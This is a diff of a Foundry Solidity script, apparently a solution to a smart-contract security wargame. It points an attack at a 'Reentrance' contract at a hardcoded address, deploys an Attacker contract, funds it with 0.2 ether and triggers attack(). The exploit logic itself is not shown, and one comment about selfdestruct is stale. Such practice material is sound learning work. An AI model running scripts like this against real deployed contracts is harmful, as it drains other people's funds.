@@ -3,6 +3,7 @@ pragma solidity ^0.6.12;
 
 import "forge-std/Script.sol";
 import "../src/Attacker.sol";
+import "../src/Contract.sol";
 import "forge-std/console.sol";
 
 contract AttackScript is Script {
@@ -11,22 +12,14 @@ contract AttackScript is Script {
     //solveed by using the selfdestruct() to send ether to another contract
     function run() public {
         vm.startBroadcast();
-        King kingContract = King(
-            payable(0x1d65AB46D84e509D4Df3a3d518A0dA52a1c19460)
-        );
+        Reentrance reentranceContract = Reentrance(0x74fFfbc41d7595a0d6C1187B969e8cd9B18458Ea);
+        Attacker attacker = new Attacker(reentranceContract);
 
-        //create attacker
-        Attacker attacker = new Attacker(kingContract);
+       (bool success, ) = payable(address(attacker)).call{value: 0.2 ether}("");
+       require(success == true, 'eth send failed');
 
-        (bool success, ) = address(attacker).call{
-            value: kingContract.prize() + 1000 wei
-        }("");
-        require(success == true, "script failed");
-
-        // call attack fcn
         attacker.attack();
 
-        console.log('new king is', kingContract._king());
         vm.stopBroadcast();
     }
 }
